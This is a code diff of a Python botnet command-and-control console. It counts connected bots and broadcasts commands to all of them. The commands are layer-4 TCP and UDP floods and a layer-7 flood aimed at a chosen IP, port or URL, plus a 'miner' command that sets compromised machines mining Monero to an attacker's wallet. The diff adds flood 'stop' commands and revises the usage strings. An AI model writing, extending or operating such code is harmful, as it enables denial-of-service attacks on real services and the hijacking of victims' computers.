@@ -55,10 +55,11 @@ help_menu = """\033[90m
 """
 
 methods = """\033[90m
-  -/-\033[35m l4 tcp \033[90m-/-
-  -/-\033[35m l4 udp \033[90m-/-
-  -/-\033[35m l7 tcp \033[90m-/-
-  -/-\033[35m l7 udp \033[90m-/-
+  -/-\033[35m l4 tcp \033[90m     -/-
+  -/-\033[35m l4 udp \033[90m     -/-
+  
+  -/-\033[35m l4 tcp stop \033[90m-/-
+  -/-\033[35m l4 udp stop \033[90m-/-
 """
 
 print(banner)
@@ -85,7 +86,6 @@ def listen():
 
 
 def title():
-
     while 1:
         if sys.platform != "linux":
             os.system(f"title bots: {len(clients)}")
@@ -119,7 +119,6 @@ t.start()
 
 
 def server():
-
     # Local
     while True:
         console = input(local)
@@ -136,10 +135,10 @@ def server():
         elif console == "methods":
             print(methods)
 
-        elif console in ["l4 tcp", "l4 udp", "l7 tcp", "l7 udp", "disconnect"]:
+        elif console in ["l4 tcp", "l4 udp", "l4 tcp stop", "l4 udp stop", "disconnect"]:
             print("\033[31m[-]\033[0m You are not connected\n")
 
-        # CnC
+        # Remote
         elif console == "connect":
             if len(clients) > 0:
                 print("\033[32m[+]\033[0m Connection established\n")
@@ -175,33 +174,38 @@ def server():
                             print("Usage: miner <pool:port> <monero_wallet> <worker_name>")
 
                     # Methods
+                    elif console == "l4 tcp stop":
+                        for client in clients:
+                            client.sendall(console.encode())
+
+                    elif console == "l4 udp stop":
+                        for client in clients:
+                            client.sendall(console.encode())
+
+                    elif console == "l7 tcp stop":
+                        for client in clients:
+                            client.sendall(console.encode())
+
                     elif console.startswith("l4 tcp"):
                         if len(console.split()) == 5:
                             for client in clients:
                                 client.sendall(console.encode())
                         else:
-                            print("Usage: l4 tcp <ip> <port> <threads>\n")
+                            print("Usage: l4 tcp <ip> <port> <bytes>\n")
 
                     elif console.startswith("l4 udp"):
-                        if len(console.split()) == 5:
+                        if len(console.split()) == 4:
                             for client in clients:
                                 client.sendall(console.encode())
                         else:
-                            print("Usage: l4 udp <ip> <port> <threads>\n")
+                            print("Usage: l4 udp <ip> <bytes>\n")
 
                     elif console.startswith("l7 tcp"):
                         if len(console.split()) == 4:
                             for client in clients:
                                 client.sendall(console.encode())
                         else:
-                            print("Usage: l7 tcp <http(s)://> <threads>\n")
-
-                    elif console.startswith("l7 udp"):
-                        if len(console.split()) == 5:
-                            for client in clients:
-                                client.sendall(console.encode())
-                        else:
-                            print("Usage: l7 udp <ip> <port> <threads>\n")
+                            print("Usage: l7 tcp <ip> <port> <bytes>\n")
 
                     else:
                         for client in clients:
